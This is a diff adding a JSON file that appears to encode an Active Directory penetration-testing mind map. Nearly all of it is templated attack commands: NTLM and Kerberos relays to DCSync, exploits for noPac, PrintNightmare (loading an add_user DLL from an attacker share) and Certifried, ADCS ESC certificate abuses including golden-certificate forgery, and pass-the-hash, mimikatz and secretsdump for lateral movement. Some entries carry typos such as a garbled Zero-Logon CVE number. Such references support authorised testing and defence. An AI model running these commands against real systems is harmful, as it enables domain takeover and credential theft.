+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "ntlmrelayx.py -t mssql://<ip> [-smb2support] -socks`",
+       "cve": false,
+       "flow": "MSSQL Socks"
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "SMB -> NETLOGON",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Zero-Logon (safe method) (CVE-202-1472)",
+       "cve": true,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": false,
+       "t": "Relay one dc to another",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": true,
+       "t": "ntlmrelayx.py -t dcsync://<dc_to_ip> -smb2support -auth-smb <user>:<password>`",
+       "cve": false,
+       "flow": "DCSYNC"
+      }
+     ]
+    },
+    {
+     "title": "Kerberos relay",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "To HTTP",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "krbrelayx.py -t 'http://<pki>/certsrv/certfnsh.asp' --adcs --template DomainController -v '<target_netbios>$' -ip <attacker_ip>`",
+       "cve": false,
+       "flow": "ESC8"
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "SMB -> SMB",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "same as NTLM relay, use krbrelayx.py",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "SMB -> LDAP(S)",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "same as NTLM relay, use krbrelayx.py",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    }
+   ]
+  },
+  "know_vuln_auth": {
+   "title": "Know vulnerabilities authenticated",
+   "subjects": [
+    {
+     "title": "MS14-068",
+     "flows": [
+      [
+       "PTT"
+      ],
+      [
+       "Domain admin",
+       "Admin"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "findSMB2UPTime.py <ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "ms14-068.py -u <user>@<domain> -p <password> -s <user_sid> -d <dc_fqdn>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "msf> use auxiliary/admin/kerberos/ms14_068_kerberos_checksum",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "goldenPac.py -dc-ip <dc_ip> <domain>/<user>:<password>@target",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "GPP MS14-025",
+     "flows": [
+      [
+       "Domain admin"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "msf> use auxiliary/scanner/smb/smb_enum_gpp",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "findstr /S /I cpassword \\\\<domain_fqdn>\\sysvol\\<domain_fqdn>\\policies\\*.xml",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "Get-GPPPassword.py <domain>/<user>:<password>@<dc_fqdn>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "PrivExchange (CVE-2019-0724, CVE-2019-0686)",
+     "flows": [
+      [
+       "HTTP Coerce"
+      ],
+      [
+       "Domain admin",
+       "Admin"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "privexchange.py -ah <attacker_ip> <exchange_host> -u <user> -d <domain> -p <password>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "noPac (CVE-2021-42287, CVE-2021-42278)",
+     "flows": [
+      [
+       "PTT"
+      ],
+      [
+       "DCSYNC"
+      ],
+      [
+       "Domain admin"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "nxc smb <ip> -u 'user' -p 'pass' -M nopac #scan",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "noPac.exe -domain <domain> -user <user> -pass <password> /dc <dc_fqdn> /mAccount <machine_account> /mPassword <machine_password> /service cifs /ptt",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "PrintNightmare (CVE-2021-1675, CVE-2021-34527)",
+     "flows": [
+      [
+       "Admin"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "nxc smb <ip> -u 'user' -p 'pass' -M printnightmare #scan",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "printnightmare.py -dll '\\\\<attacker_ip>\\smb\\add_user.dll' '<user>:<password>@<ip>'",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Certifried (CVE-2022-26923)",
+     "flows": [
+      [
+       "PTT"
+      ],
+      [
+       "DCSYNC"
+      ],
+      [
+       "Domain admin"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Create account",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "certipy account create -u <user>@<domain> -p '<password>' -user 'certifriedpc' -pass 'certifriedpass' -dns '<fqdn_dc>'",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Request",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "certipy req -u 'certifriedpc$'@<domain> -p 'certifriedpass' -target <ca_fqdn> -ca <ca_name> -template Machine",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Authentication",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "certipy auth -pfx <pfx_file> -username '<dc>$' -domain <domain> -dc-ip <dc_ip>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "ProxyNotShell (CVE-2022-41040, CVE-2022-41082)",
+     "flows": [
+      [
+       "Admin"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "poc_aug3.py <host> <username> <password> <command>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    }
+   ]
+  },
+  "adcs": {
+   "title": "ADCS",
+   "subjects": [
+    {
+     "title": "Enumeration",
+     "flows": [
+      [
+       "Web enrollement",
+       "Vulnerable template",
+       "Vulnerable CA",
+       "Misconfigured ACL",
+       "Vulnerable PKI Object AC"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "certutil -v -dsTemplate",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "certify.exe find [ /vulnerable]",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "certipy find -u <user>@<domain> -p <password> -dc-ip <dc_ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "ldeep ldap -u <user> -p <password> -d <domain> -s <dc_ip> templates",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Get PKI objects information",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "certify.exe pkiobjects",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Display CA information",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "certutil -TCAInfo",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "certify.exe cas",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Web Enrollment Is Up",
+     "flows": [
+      [
+       "Domain admin"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "ESC8",
+       "cve": false,
+       "flow": "Pass the ticket >>> DCSYNC || LDAP shell"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "ntlmrelayx.py -t http://<dc_ip>/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "gettgtpkinit.py -pfx-base64 $(cat cert.b64) <domain>/<dc_name>$ <ccache_file>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "certipy relay -target http://<ip_ca>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "certipy auth -pfx <certificate> -dc-ip <dc_ip>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Misconfigured Certificate Template",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "ESC1",
+       "cve": false,
+       "flow": "Pass the certificate"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>'  -ca <ca_name> -upn <target_user>@<domain>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "certify.exe request /ca:<server>\\<ca-name>   /template:\"<vulnerable template name>\" [/altname:\"Admin\"]",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "ESC2",
+       "cve": false,
+       "flow": "ESC3"
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "ESC3",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "certify.exe request /ca:<server>\\<ca-name> /template:\"<vulnerable template name>\"",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "certify.exe request request /ca:<server>\\<ca-name> /template:<template>  /onbehalfof:<domain>\\<user> /enrollcert:<path.pfx> [/enrollcertpw:<cert-password>]",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>'  -ca <ca_name>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template  '<vulnerable template name>'  -ca <ca_name> -on-behalf-of '<domain>\\<user>' -pfx <cert>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "ESC13",
+       "cve": false,
+       "flow": "Pass The Certificate (PKINIT)"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "certipy req -u <user>@<domain> -p <password> -target <ca_server>  -template '<vulnerable template name>' -ca <ca_name>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "certify.exe request /ca:<server>\\<ca-name> /template:\"<vulnerable template name>\"",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "ESC15",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<version 1 template with enrolee flag>' -ca <ca_name> -upn <target_user>@<domain> --application-policies 'Client Authentication' #[PR 228]`",
+       "cve": false,
+       "flow": "Pass the certificate (only Schannel)"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<version 1 template with enrolee flag>' -ca <ca_name> --application-policies 'Certificate Request Agent' # [PR 228]`",
+       "cve": false,
+       "flow": "Pass the certificate"
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>' -ca <ca_name> -on-behalf-of '<domain>\\<user>' -pfx <cert>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Misconfigured ACL",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "ESC4",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "write privilege over a certificate template",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "certipy template -u <user>@<domain> -p '<password>' -template <vuln_template> -save-old -debug`",
+       "cve": false,
+       "flow": "ESC1"
+      },
+      {
+       "d": 2,
+       "cmd": false,
+       "t": "restore template",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": true,
+       "t": "certipy template -u <user>@<domain> -p '<password>' -template <vuln_template> -configuration <template>.json",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "ESC7",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Manage CA",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "certipy ca -ca <ca_name> -add-officer  '<user>' -username <user>@<domain> -password <password> -dc-ip <dc_ip> -target-ip <target_ip>`",
+       "cve": false,
+       "flow": "ESC7 Manage certificate"
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Manage certificate",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "certipy ca  -ca <ca_name> -enable-template '<ecs1_vuln_template>' -username <user>@<domain> -password <password>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": true,
+       "t": "certipy  req -username <user>@<domain> -password <password> -ca <ca_name> -template '<vulnerable template name>' -upn '<target_user>'",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 4,
+       "cmd": false,
+       "t": "error, but save private key and get issue request",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": false,
+       "t": "Issue request",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": true,
+       "t": "certipy ca -u <user>@<domain> -p '<password>' -ca <ca_name> -issue-request <request_id>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 4,
+       "cmd": true,
+       "t": "certipy req -u <user>@<domain> -p '<password>'  -ca <ca_name> -retreive <request_id>`",
+       "cve": false,
+       "flow": "Pass the certificate"
+      }
+     ]
+    },
+    {
+     "title": "Vulnerable PKI Object access control",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "ESC5",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Vulnerable acl on PKI",
+       "cve": false,
+       "flow": "ACL"
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Golden certificate",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "certipy ca -backup -u <user>@<domain> -hashes <hash_nt> -ca <ca_name> -debug -target <ca_ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": true,
+       "t": "certipy forge -ca-pfx '<adcs>.pfx' -upn administrator@<domain>`",
+       "cve": false,
+       "flow": "Pass the certificate"
+      }
+     ]
+    },
+    {
+     "title": "Misconfigured Certificate Authority",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "ESC6",
+       "cve": true,
+       "flow": "ESC1"
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Abuse ATTRIBUTESUBJECTALTNAME2 flag set on CA you can choose any certificate template that permits client authentication",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "ESC11",
+       "cve": false,
+       "flow": "Pass the ticket >>> DCSYNC >>> Domain Admin"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "ntlmrelayx.py -t rpc://<ca_ip> -smb2support -rpc-mode ICPR -icpr-ca-name <ca_name>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "gettgtpkinit.py -pfx-base64 $(cat cert.b64) <domain>/<dc_name>$ <ccache_file>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "certipy relay -target rpc://<ip_ca> -ca '<ca_name>'",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "certipy auth -pfx <certificate> -dc-ip <dc_ip>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Abuse Certificate Mapping",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "ESC9/ESC10 (implicit)",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "certipy shadow auto -username <accountA>@<domain> -p <passA> -account <accountB>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": false,
+       "t": "ESC9/ESC10 (Case 1)",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": true,
+       "t": "certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn Administrator`",
+       "cve": false,
+       "flow": "reset accountB UPN"
+      },
+      {
+       "d": 4,
+       "cmd": false,
+       "t": "ESC9",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 5,
+       "cmd": true,
+       "t": "certipy req  -username <accountB>@<domain> -hashes <hashB> -ca <ca_name> -template <vulnerable template>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 4,
+       "cmd": false,
+       "t": "ESC10 (case 1)",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 5,
+       "cmd": true,
+       "t": "certipy req  -username <accountB>@<domain> -hashes <hashB> -ca <ca_name> -template <any template with client auth>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": false,
+       "t": "ESC10 (Case 2)",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": true,
+       "t": "certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn '<dc_name$>@<domain>'`",
+       "cve": false,
+       "flow": "ESC10  Case1"
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "reset accountB UPN",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn <accountB>@<domain>`",
+       "cve": false,
+       "flow": "Pass The Certificate"
+      },
+      {
+       "d": 3,
+       "cmd": false,
+       "t": "[Kerberos Mapping] ESC9/ESC10(Case 1)",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": false,
+       "t": "[Schannel Mapping] ESC9/ESC10 (Case 2)",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "ESC14 (explicit)",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    }
+   ]
+  },
+  "lat_move": {
+   "title": "Lateral Move",
+   "subjects": [
+    {
+     "title": "Clear text Password",
+     "flows": [
+      [
+       "Admin"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Interactive-shell - psexec",
+       "cve": false,
+       "flow": "Authority/System"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "psexec.py <domain>/<user>:<password>@<ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "psexec.exe -AcceptEULA \\\\<ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "psexecsvc.py <domain>/<user>:<password>@<ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Pseudo-shell (file write and read)",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "atexec.py  <domain>/<user>:<password>@<ip> \"command\"",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "smbexec.py  <domain>/<user>:<password>@<ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "wmiexec.py  <domain>/<user>:<password>@<ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "dcomexec.py  <domain>/<user>:<password>@<ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "nxc smb <ip_range> -u <user> -p <password> -d <domain> -x <cmd>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "WinRM",
+       "cve": false,
+       "flow": "Low access || Admin"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "evil-winrm -i <ip> -u <user> -p <password>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "Enter-PSSession -ComputerName <computer> -Credential <domain>\\<user>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "nxc winrm <ip_range> -u <user> -p <password> -d <domain> -x <cmd>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "RDP",
+       "cve": false,
+       "flow": "Low access || Admin"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "xfreerdp /u:<user> /d:<domain> /p:<password> /v:<ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "SMB",
+       "cve": false,
+       "flow": "Search files"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "smbclient.py <domain>/<user>:<password>@<ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "smbclient-ng.py -d <domain> -u <user> -p <password> --host <ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "MSSQL",
+       "cve": false,
+       "flow": "MSSQL"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "nxc mssql <ip_range> -u <user> -p <password>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "NT Hash",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Pass the Hash",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "MSSQL/PseudoShell PsExec/SMB...",
+       "cve": false,
+       "flow": "Admin"
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "impacket : same as with creds, but use -hashes ':<hash>'",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "nxc : same as with creds, but use -H ':<hash>'",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "mimikatz \"privilege::debug sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>\"`",
+       "cve": false,
+       "flow": "Admin"
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "RDP",
+       "cve": false,
+       "flow": "Low access || Admin"
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "reg.py <domain>/<user>@<ip> -hashes ':<hash>' add -keyName 'HKLM\\System\\CurrentControlSet\\Control\\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": true,
+       "t": "xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "WinRM",
+       "cve": false,
+       "flow": "Low access || Admin"
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "evil-winrm -i <ip> -u <user> -H <hash>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Overpass the Hash / Pass the key (PTK)",
+       "cve": false,
+       "flow": "Admin"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "Rubeus.exe asktgt /user:victim /rc4:<rc4value>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "Rubeus.exe ptt /ticket:<ticket>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "Rubeus.exe createnetonly /program:C:\\Windows\\System32\\[cmd.exe||upnpcont.exe]",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "getTGT.py <domain>/<user> -hashes :<hashes>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Kerberos",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Pass the Ticket (ccache / kirbi)",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Convert Format",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "ticketConverter.py <kirbi||ccache> <ccache||kirbi>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "export KRB5CCNAME=/root/impacket-examples/domain_ticket.ccache`",
+       "cve": false,
+       "flow": "Admin"
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "impacket tools: Same as Pass the hash but use : -k and -no-pass for impacket",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "mimikatz kerberos::ptc \"<ticket>\"",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "Rubeus.exe ptt /ticket:<ticket>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "proxychains secretsdump.py -k'<domain>'/'<user>'@'<ip>'",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Modify SPN",
+       "cve": false,
+       "flow": "PassTheTicket"
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "tgssub.py -in <ticket.ccache> -out <newticket.ccache> -altservice \"<service>/<target>\" #pr 1256",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Aeskey",
+       "cve": false,
+       "flow": "Admin"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "impacket tools: Same as Pass the hash but use : -aesKey for impacket (and use FQDN)",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "proxychains secretsdump.py -aesKey <key> '<domain>'/'<user>'@'<ip>'",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Socks (relay)",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "proxychains lookupsid.py <domain>/<user>@<ip> -no-pass -domain-sids",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "proxychains mssqlclient.py -windows-auth <domain>/<user>@<ip> -no-pass`",
+       "cve": false,
+       "flow": "MSSQL"
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "proxychains secretsdump.py -no-pass '<domain>'/'<user>'@'<ip>'`",
+       "cve": false,
+       "flow": "DCSYNC"
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "proxychains smbclient.py -no-pass <user>@<ip>`",
+       "cve": false,
+       "flow": "Search files"
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "proxychains atexec.py  -no-pass  <domain>/<user>@<ip> \"command\"`",
+       "cve": false,
+       "flow": "Authority/System"
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "proxychains smbexec.py  -no-pass  <domain>/<user>@<ip>`",
+       "cve": false,
+       "flow": "Authority/System"
+      }
+     ]
+    },
+    {
+     "title": "Certificate (pfx)",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "unpac the hash",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "certipy auth -pfx <crt_file> -dc-ip <dc_ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "gettgtpkinit.py -cert-pfx <crt.pfx> -pfx-pass <crt_pass> \"<domain>/<dc_name>\" <tgt.ccache>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "getnthash.py -key '<AS-REP encryption key>' '<domain>'/'<dc_name>'",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Pass the certificate",
+       "cve": false,
+       "flow": null
